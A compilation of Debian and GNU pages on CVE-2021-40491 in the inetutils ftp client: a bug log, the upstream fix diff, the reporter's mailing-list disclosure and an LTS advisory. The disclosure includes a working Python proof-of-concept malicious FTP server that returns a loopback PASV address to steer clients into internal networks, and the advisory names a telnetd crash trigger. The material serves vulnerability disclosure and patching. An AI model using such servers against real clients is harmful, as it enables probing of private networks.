=== Content from bugs.debian.org_86e239a3_20250114_215516.html ===

# Debian Bug report logs - #993476 inetutils: CVE-2021-40491: tp client didn't validate that PASV/LSPV addresses match

[![version graph](version.cgi?collapse=1;found=inetutils%2F2%3A2.0-1;found=inetutils%2F2%3A1.9.4-7;found=inetutils%2F2%3A1.9.4-7%2Bdeb10u1;package=inetutils-ftp;absolute=0;width=2;height=2;fixed=inetutils%2F2%3A2.2-1)](version.cgi?found=inetutils%2F2%3A2.0-1;found=inetutils%2F2%3A1.9.4-7;found=inetutils%2F2%3A1.9.4-7%2Bdeb10u1;collapse=1;package=inetutils-ftp;absolute=0;fixed=inetutils%2F2%3A2.2-1;info=1)

Package:
[inetutils-ftp](pkgreport.cgi?package=inetutils-ftp);
Maintainer for [inetutils-ftp](pkgreport.cgi?package=inetutils-ftp) is [Guillem Jover <guillem@debian.org>](pkgreport.cgi?maint=guillem%40debian.org); Source for [inetutils-ftp](pkgreport.cgi?package=inetutils-ftp) is [src:inetutils](pkgreport.cgi?src=inetutils) ([PTS](https://tracker.debian.org/pkg/inetutils), [buildd](https://buildd.debian.org/inetutils), [popcon](https://qa.debian.org/popcon.php?package=inetutils)).

Reported by: [Simon Josefsson <simon@josefsson.org>](pkgreport.cgi?submitter=simon%40josefsson.org)

Date: Wed, 1 Sep 2021 20:24:02 UTC

Severity: normal

Tags: fixed-upstream, pending, upstream

Found in versions inetutils/2:2.0-1, inetutils/2:1.9.4-7, inetutils/2:1.9.4-7+deb10u1

Fixed in version inetutils/2:2.2-1

**Done:** Guillem Jover <guillem@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=993476;mbox=yes), [status mbox](bugreport.cgi?bug=993476;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=993476;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Guillem Jover <guillem@debian.org>`:

`Bug#993476`; Package `inetutils-ftp`.
(Wed, 01 Sep 2021 20:24:04 GMT) ([full text](bugreport.cgi?bug=993476;msg=2), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Simon Josefsson <simon@josefsson.org>`:

New Bug report received and forwarded. Copy sent to `Guillem Jover <guillem@debian.org>`.
(Wed, 01 Sep 2021 20:24:04 GMT) ([full text](bugreport.cgi?bug=993476;msg=4), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=993476;msg=5), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40josefsson.org)
From: Simon Josefsson <simon@josefsson.org>
To: submit@bugs.debian.org
Subject: inetutils: security bug in ftp client
Date: Wed, 01 Sep 2021 22:20:25 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=993476;msg=5) (text/plain, inline)]
```
```
Package: inetutils-ftp

Hi!  Just to let you know that inetutils 2.2 contains a fix for
long-standing security bug, a patch that should apply to earlier
versions:

<https://git.savannah.gnu.org/cgit/inetutils.git/commit/?id=58cb043b190fd04effdaea7c9403416b436e50dd>

See bug report with plenty of links to earlier similar issues in other
ftp clients:

<https://lists.gnu.org/archive/html/bug-inetutils/2021-06/msg00002.html>

/Simon

```
```
[[signature.asc](bugreport.cgi?att=1;bug=993476;filename=signature.asc;msg=5) (application/pgp-signature, inline)]
```

---

**Reply sent**
to `Guillem Jover <guillem@debian.org>`:

You have taken responsibility.
(Thu, 02 Sep 2021 05:24:02 GMT) ([full text](bugreport.cgi?bug=993476;msg=7), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=7), [link](#6)).

---

**Notification sent**
to `Simon Josefsson <simon@josefsson.org>`:

Bug acknowledged by developer.
(Thu, 02 Sep 2021 05:24:02 GMT) ([full text](bugreport.cgi?bug=993476;msg=9), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 993476-close@bugs.debian.org ([full text](bugreport.cgi?bug=993476;msg=10), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=ftpmaster%40ftp-master.debian.org)
From: Debian FTP Masters <ftpmaster@ftp-master.debian.org>
To: 993476-close@bugs.debian.org
Subject: Bug#993476: fixed in inetutils 2:2.2-1
Date: Thu, 02 Sep 2021 05:21:00 +0000
```
Source: inetutils
Source-Version: 2:2.2-1
Done: Guillem Jover <guillem@debian.org>

We believe that the bug you reported is fixed in the latest version of
inetutils, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 993476@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Guillem Jover <guillem@debian.org> (supplier of updated inetutils package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Thu, 02 Sep 2021 07:02:33 +0200
Source: inetutils
Architecture: source
Version: 2:2.2-1
Distribution: unstable
Urgency: medium
Maintainer: Guillem Jover <guillem@debian.org>
Changed-By: Guillem Jover <guillem@debian.org>
Closes: [993476](bugreport.cgi?bug=993476)
Changes:
 inetutils (2:2.2-1) unstable; urgency=medium
 .
   * New upstream release.
     - Fix inetutils-ftp security bug trusting FTP PASV responses.
       Closes: #[993476](bugreport.cgi?bug=993476)
Checksums-Sha1:
 3da9453b358861a17711683d7998de88c98d69fb 3056 inetutils_2.2-1.dsc
 a6b0783d315657e51a09ee281af1210cc5293b9f 1529508 inetutils_2.2.orig.tar.xz
 bcf6f5804cba5915d1fb513d2981b09164c162ac 488 inetutils_2.2.orig.tar.xz.asc
 743a2c588e19ab77f5783937ec3b155545934bea 76784 inetutils_2.2-1.debian.tar.xz
 c8ebb601ca738493f8cac53de97fe7b6bf12204a 12254 inetutils_2.2-1_amd64.buildinfo
Checksums-Sha256:
 e83f3dbeb995dc70efa352950f2b4acdf05d5ebd271658a3dc81f56f227acfe5 3056 inetutils_2.2-1.dsc
 d547f69172df73afef691a0f7886280fd781acea28def4ff4b4b212086a89d80 1529508 inetutils_2.2.orig.tar.xz
 812c2c7837a9729f73e4af99a13ef649405b737530070cccb4a6f41d2cd81b74 488 inetutils_2.2.orig.tar.xz.asc
 816b8a33e0a0429076106e5ccbb5536e65ce33d0d1f5b04a5214ed6f5853275f 76784 inetutils_2.2-1.debian.tar.xz
 b2f057952f2f7b1d34f29822bfb810bf85413382ab9b2b0036e7ee41ce5c9cc8 12254 inetutils_2.2-1_amd64.buildinfo
Files:
 06cd1594a314011a33d420f97de00bc5 3056 net optional inetutils_2.2-1.dsc
 de8c1b49cbde2b30e481c61c65357ad4 1529508 net optional inetutils_2.2.orig.tar.xz
 fc503b580068e616dbb85e4316435691 488 net optional inetutils_2.2.orig.tar.xz.asc
 a70bdc6f2a9365d47db9f3e38c659418 76784 net optional inetutils_2.2-1.debian.tar.xz
 4332b96a09bf55fd37314a7f7e352b6f 12254 net optional inetutils_2.2-1_amd64.buildinfo

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEETz509DYFDBD1aWV0uXK/PqSuV6MFAmEwW7MACgkQuXK/PqSu
V6PA0hAAketgF5LXhG2WBLlLrKTAUMFSqbQ1cTJ2ZdukC/tPqN8QpDUMxpBihnjB
ArhE2ExZbep6IFP6HLBniKwfd9G7K8E+eDtu6Mfd/hAYT8fFdRxp17p44pJOmP76
c0NvcUiYStbPSUwKIywv5u+WQydAvsLXbt/83b6mT5L0zy7dWzTMBnh5FJDwrFWi
F28KOJMzmytjyi/KxFGRNeSwC4oLls/lfKTITfmDvYhT3gvrqmLtdT7vHpYB+MYl
Y54pX/zWvvv3BMx5+SS5zgSRvcdQhFs79VdB8vIyKBUTG5miqczQqjBhRge9gkmC
xCPDi0O2gMMjd2O2AKs1A1SkO8RYXWhHIPGEZe9gLO0CQ5dtA5h9099g2+D7m7W3
zvJBZtvaQcX9wX7mbRmRDifKdb4+Jodxb2MkbPQejFueZekFZkK+fKQWyd0y3HIi
i8ygY6wm+mpuKmHJWP9ePSLbfUYWyk76dYf04zFn1EiJj9dLTN4ExPMHIp1ysjrZ
ZD+sEPsZVF5qNNgo5YdKk8H7J1r2Dfi52gAND3XWNItWB94urbg+JTOmiB5xdY/N
0h2o7cZZSB4osHqOVo2NlHz6p+7G1mkWTMfoIrndpUH/XN1xfvV1Gq0E+XBzf7TR
grdy9jktgZUSxefRujfpVclX+/ZBwd495YvX7+YESBjoMZcTtfk=
=3+nY
-----END PGP SIGNATURE-----

```

---

**Message sent on**
to `Simon Josefsson <simon@josefsson.org>`:

Bug#993476.
(Thu, 02 Sep 2021 05:36:08 GMT) ([full text](bugreport.cgi?bug=993476;msg=12), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=12), [link](#11)).

---

[Message #13](#13) received at 993476-submitter@bugs.debian.org ([full text](bugreport.cgi?bug=993476;msg=13), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=13), reply):

![](/cgi-bin/libravatar.cgi?email=guillem%40debian.org)
From: Guillem Jover <guillem@debian.org>
To: 993476-submitter@bugs.debian.org
Subject: Bug#993476 in package inetutils marked as pending
Date: Thu, 02 Sep 2021 07:06:58 +0200
```
Control: tag 993476 pending

Hi!

Bug #993476 that you reported in package inetutils has been fixed
in the debian/pkgs/inetutils.git git repository. You can see the changelog below,
and you can check the diff of the fix at:

    <https://git.hadrons.org/cgit/debian/pkgs/inetutils.git/diff/?id=a78d49d>

---
commit a78d49d52ecb4b1d5754301c98079fe5df209c59
Author: Guillem Jover <guillem@debian.org>
Date:   Thu Sep 2 07:01:48 2021 +0200

    New upstream release 2.2

    - Fix inetutils-ftp security bug trusting FTP PASV responses.
      Closes: #[993476](bugreport.cgi?bug=993476)

diff --git a/debian/changelog b/debian/changelog
index 7225c69..9830148 100644
--- a/debian/changelog
+++ b/debian/changelog
@@ -1,3 +1,11 @@
+inetutils (2:2.2-1) UNRELEASED; urgency=medium
+
+  * New upstream release.
+    - Fix inetutils-ftp security bug trusting FTP PASV responses.
+      Closes: #[993476](bugreport.cgi?bug=993476)
+
+ -- Guillem Jover <guillem@debian.org>  Thu, 02 Sep 2021 06:49:19 +0200
+
 inetutils (2:2.1-2) unstable; urgency=medium

   * Allow stderr output on autopkgtests, given that we are running configure

```

---

**Added tag(s) pending.**
Request was from `Guillem Jover <guillem@debian.org>`
to `993476-submitter@bugs.debian.org`.
(Thu, 02 Sep 2021 05:36:08 GMT) ([full text](bugreport.cgi?bug=993476;msg=15), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=15), [link](#14)).

---

**Marked as found in versions inetutils/2:2.0-1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Thu, 02 Sep 2021 14:51:02 GMT) ([full text](bugreport.cgi?bug=993476;msg=17), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=17), [link](#16)).

---

**Marked as found in versions inetutils/2:1.9.4-7+deb10u1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Thu, 02 Sep 2021 14:51:04 GMT) ([full text](bugreport.cgi?bug=993476;msg=19), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=19), [link](#18)).

---

**Marked as found in versions inetutils/2:1.9.4-7.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Thu, 02 Sep 2021 14:51:05 GMT) ([full text](bugreport.cgi?bug=993476;msg=21), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=21), [link](#20)).

---

**Changed Bug title to 'inetutils: CVE-2021-40491: tp client didn't validate that PASV/LSPV addresses match' from 'inetutils: security bug in ftp client'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Fri, 03 Sep 2021 04:06:03 GMT) ([full text](bugreport.cgi?bug=993476;msg=23), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=23), [link](#22)).

---

**Added tag(s) fixed-upstream and upstream.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Fri, 03 Sep 2021 04:33:02 GMT) ([full text](bugreport.cgi?bug=993476;msg=25), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=25), [link](#24)).

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sat, 02 Oct 2021 07:28:27 GMT) ([full text](bugreport.cgi?bug=993476;msg=27), [mbox](bugreport.cgi?bug=993476;mbox=yes;msg=27), [link](#26)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=993476).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Tue Jan 14 21:55:16 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright Â© 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from git.savannah.gnu.org_f3ab5794_20250114_215519.html ===


| [cgit logo](/cgit/) | [index](/cgit/) : [inetutils.git](/cgit/inetutils.git/ "inetutils.git") | bsd master master-UNNAMED-BRANCH release1\_4\_0 ucbinetd |
| --- | --- | --- |
| GNU Inetutils |  |

| [summary](/cgit/inetutils.git/)[refs](/cgit/inetutils.git/refs/?id=58cb043b190fd04effdaea7c9403416b436e50dd)[log](/cgit/inetutils.git/log/)[tree](/cgit/inetutils.git/tree/?id=58cb043b190fd04effdaea7c9403416b436e50dd)[commit](/cgit/inetutils.git/commit/?id=58cb043b190fd04effdaea7c9403416b436e50dd)[diff](/cgit/inetutils.git/diff/?id=58cb043b190fd04effdaea7c9403416b436e50dd) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Simon Josefsson <simon@josefsson.org> | 2021-09-01 09:09:50 +0200 |
| --- | --- | --- |
| committer | Simon Josefsson <simon@josefsson.org> | 2021-09-01 09:17:06 +0200 |
| commit | [58cb043b190fd04effdaea7c9403416b436e50dd](/cgit/inetutils.git/commit/?id=58cb043b190fd04effdaea7c9403416b436e50dd) ([patch](/cgit/inetutils.git/patch/?id=58cb043b190fd04effdaea7c9403416b436e50dd)) | |
| tree | [86e685a59130dd59812164155b9edd9812bb2901](/cgit/inetutils.git/tree/?id=58cb043b190fd04effdaea7c9403416b436e50dd) | |
| parent | [8586a5b3fe3302320b923ee31f9994e75708566e](/cgit/inetutils.git/commit/?id=8586a5b3fe3302320b923ee31f9994e75708566e) ([diff](/cgit/inetutils.git/diff/?id=58cb043b190fd04effdaea7c9403416b436e50dd&id2=8586a5b3fe3302320b923ee31f9994e75708566e)) | |
| download | [inetutils-58cb043b190fd04effdaea7c9403416b436e50dd.tar.gz](/cgit/inetutils.git/snapshot/inetutils-58cb043b190fd04effdaea7c9403416b436e50dd.tar.gz) | |

ftp: check that PASV/LSPV addresses match.\* NEWS: Mention change.
\* ftp/ftp.c (initconn): Validate returned addresses.
[Diffstat](/cgit/inetutils.git/diff/?id=58cb043b190fd04effdaea7c9403416b436e50dd)

| -rw-r--r-- | [NEWS](/cgit/inetutils.git/diff/NEWS?id=58cb043b190fd04effdaea7c9403416b436e50dd) | 9 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [ftp/ftp.c](/cgit/inetutils.git/diff/ftp/ftp.c?id=58cb043b190fd04effdaea7c9403416b436e50dd) | 21 | |  |  |  | | --- | --- | --- | |

2 files changed, 30 insertions, 0 deletions

| diff --git a/NEWS b/NEWSindex f2ac9ea..9cc42c0 100644--- a/[NEWS](/cgit/inetutils.git/tree/NEWS?id=8586a5b3fe3302320b923ee31f9994e75708566e)+++ b/[NEWS](/cgit/inetutils.git/tree/NEWS?id=58cb043b190fd04effdaea7c9403416b436e50dd)@@ -2,6 +2,15 @@ GNU inetutils NEWS -- history of user-visible changes.  \* Noteworthy changes in release ?.? (????-??-??) [?] +\*\* ftp++The ftp client now validate addresses returned by PASV/LSPV responses,+to make sure they match the server address. Reported by ZeddYu Lu in+<https://lists.gnu.org/archive/html/bug-inetutils/2021-06/msg00002.html>.++Thanks to Luke Mewburn <lukem@netbsd.org> for discussion and fix to+NetBSD code, we used a similar solution.+ \*\* logger \*\* rlogind diff --git a/ftp/ftp.c b/ftp/ftp.cindex d21dbdd..7513539 100644--- a/[ftp/ftp.c](/cgit/inetutils.git/tree/ftp/ftp.c?id=8586a5b3fe3302320b923ee31f9994e75708566e)+++ b/[ftp/ftp.c](/cgit/inetutils.git/tree/ftp/ftp.c?id=58cb043b190fd04effdaea7c9403416b436e50dd)@@ -1365,6 +1365,13 @@ initconn (void) uint32\_t \*pu32 = (uint32\_t \*) &data\_addr\_sa4->sin\_addr.s\_addr; pu32[0] = htonl ( (h[0] << 24) | (h[1] << 16) | (h[2] << 8) | h[3]); }+ if (data\_addr\_sa4->sin\_addr.s\_addr+ != ((struct sockaddr\_in \*) &hisctladdr)->sin\_addr.s\_addr)+ {+ printf ("Passive mode address mismatch.\n");+ (void) command ("ABOR"); /\* Cancel any open connection. \*/+ goto bad;+ } } /\* LPSV IPv4 \*/ else /\* IPv6 \*/ {@@ -1395,6 +1402,13 @@ initconn (void) pu32[2] = htonl ( (h[8] << 24) | (h[9] << 16) | (h[10] << 8) | h[11]); pu32[3] = htonl ( (h[12] << 24) | (h[13] << 16) | (h[14] << 8) | h[15]); }+ if (data\_addr\_sa6->sin6\_addr.s6\_addr+ != ((struct sockaddr\_in6 \*) &hisctladdr)->sin6\_addr.s6\_addr)+ {+ printf ("Passive mode address mismatch.\n");+ (void) command ("ABOR"); /\* Cancel any open connection. \*/+ goto bad;+ } } /\* LPSV IPv6 \*/ } else /\* !EPSV && !LPSV \*/@@ -1415,6 +1429,13 @@ initconn (void) | ((a2 & 0xff) << 8) | (a3 & 0xff) ); data\_addr\_sa4->sin\_port = htons (((p0 & 0xff) << 8) | (p1 & 0xff));+ if (data\_addr\_sa4->sin\_addr.s\_addr+ != ((struct sockaddr\_in \*) &hisctladdr)->sin\_addr.s\_addr)+ {+ printf ("Passive mode address mismatch.\n");+ (void) command ("ABOR"); /\* Cancel any open connection. \*/+ goto bad;+ } } /\* PASV \*/ else { |
| --- |

generated by [cgit v1.1](https://git.zx2c4.com/cgit/about/) at 2025-01-14 21:55:19 +0000



=== Content from lists.gnu.org_bd59b606_20250114_215523.html ===


| | **bug-inetutils** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=bug-inetutils)

---

[[Date Prev](msg00001.html)][Date Next][[Thread Prev](msg00000.html)][Thread Next][[Date Index](index.html#00002)][[Thread Index](threads.html#00002)]

## scurity issue in inetutils ftp client

---

| **From**: | ZeddYu Lu |
| --- | --- |

| **Subject**: | scurity issue in inetutils ftp client |
| **Date**: | Fri, 11 Jun 2021 17:46:13 +0800 |

---

Last year, curl had a security update for CVE-2020-8284. more info, see <https://hackerone.com/reports/1040166>

The problem is ftp client trust the host from PASV response by default, A malicious server can trick ftp client into connecting back to a given IP address and port. This may make ftp client scan ports and extract service banner from private newwork.

After test FTP in inetutils GNU, I found the ftp client has the same problem.

Inetutils Version:

ftp (GNU inetutils) 2.0
Copyright (C) 2021 Free Software Foundation, Inc.

evil ftp server in python:

```
#!/usr/bin/env python3
import socketserver, threading, requests, subprocess,time, base64, secrets,sys, hashlib, os

class MyTCPHandler(socketserver.StreamRequestHandler):
 Ã‚Â  Ã‚Â def handle(self):
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print('[+] connected', self.request, file=sys.stderr)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')

 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.data = self.rfile.readline().strip().decode()
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print(self.data, file=sys.stderr,flush=True)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'230 Login successful.\r\n')

 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.data = self.rfile.readline().strip().decode()
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print(self.data, file=sys.stderr)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,203)\r\n')

 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.data = self.rfile.readline().strip().decode()
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print(self.data, file=sys.stderr)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,203)\r\n')

 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.data = self.rfile.readline().strip().decode()
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print(self.data, file=sys.stderr)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'200 Switching to Binary mode.\r\n')

 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.data = self.rfile.readline().strip().decode()
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print(self.data, file=sys.stderr)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'125 Data connection already open. Transfer starting.\r\n')

 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.data = self.rfile.readline().strip().decode()
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â print(self.data, file=sys.stderr)
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â self.request.sendall(b'250 Requested file action okay, completed.')
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â exit()

def ftp_worker():
 Ã‚Â  Ã‚Â with socketserver.TCPServer(('0.0.0.0', 21), MyTCPHandler) as server:
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â while True:
 Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â  Ã‚Â server.handle_request()
threading.Thread(target=ftp_worker).start()
time.sleep(2)
```

After the victim type 'ls' in ftp client, it will request 127.0.0.1. Just like the attachment. It will request the user's interlnal network.

Python also fix this issue this year. Maybe this will help you. <https://bugs.python.org/issue43285>

More impacts you could find in <https://hackerone.com/reports/1040166>.

**[![Attachment:](/icons/image2.png)](pnggfX17tYQQb.png)
[Snipaste\_2021-06-11\_15-40-46.png](pnggfX17tYQQb.png)**

*Description:* PNG image

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [Next in Thread] |
| --- | --- | --- |

* **scurity issue in inetutils ftp client**,
  *ZeddYu Lu*Â **<=**

---

* Prev by Date:
  **[Re: A possible hang bug in Telnet](msg00001.html)**
* Previous by thread:
  **[A possible hang bug in Telnet](msg00000.html)**
* Index(es):
  + [**Date**](index.html#00002)
  + [**Thread**](threads.html#00002)



=== Content from lists.debian.org_a5b94ddf_20250114_215521.html ===


---

[[Date Prev](msg00032.html)][[Date Next](msg00034.html)]
[[Thread Prev](msg00032.html)][[Thread Next](msg00034.html)]
[[Date Index](maillist.html#00033)]
[[Thread Index](threads.html#00033)]

# [SECURITY] [DLA 3205-1] inetutils security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3205-1] inetutils security update
* *From*: Guilhem Moulin <guilhem@debian.org>
* *Date*: Fri, 25 Nov 2022 20:06:45 +0100
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/Y4ESRX31m0oovmt%2B%40debian.org)Â [Y4ESRX31m0oovmt+@debian.org](msg00033.html)>
* *Mail-followup-to*: Guilhem Moulin <guilhem@debian.org>, debian-lts-announce@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3205-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                       Guilhem Moulin
November 25, 2022                             <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : inetutils
Version        : 2:1.9.4-7+deb10u2
CVE ID         : CVE-2019-0053 CVE-2021-40491 CVE-2022-39028
Debian Bug     : 945861 956084 993476

Several security vulnerabilities were discovered in inetutils, a
collection of common network programs.

CVE-2019-0053

    inetutils' telnet client doesn't sufficiently validate environment
    variables, which can lead to stack-based buffer overflows.  This
    issue is limited to local exploitation from restricted shells.

CVE-2021-40491

    inetutils' ftp client before 2.2 does not validate addresses
    returned by PSV/LSPV responses to make sure they match the server
    address.  A malicious server can exploit this flaw to reach services
    in the client's private network.  (This is similar to curl's
    CVE-2020-8284.)

CVE-2022-39028

    inetutils's telnet server through 2.3 has a NULL pointer dereference
    which a client can trigger by sending 0xff 0xf7 or 0xff 0xf8.  In a
    typical installation, the telnetd application would crash but the
    telnet service would remain available through inetd.  However, if the
    telnetd application has many crashes within a short time interval,
    the telnet service would become unavailable after inetd logs a
    "telnet/tcp server failing (looping), service terminated" error.

For Debian 10 buster, these problems have been fixed in version
2:1.9.4-7+deb10u2.

We recommend that you upgrade your inetutils packages.

For the detailed security status of inetutils please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/inetutils>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpQgH9XKANhN.pgp)**

*Description:* PGP signature

---


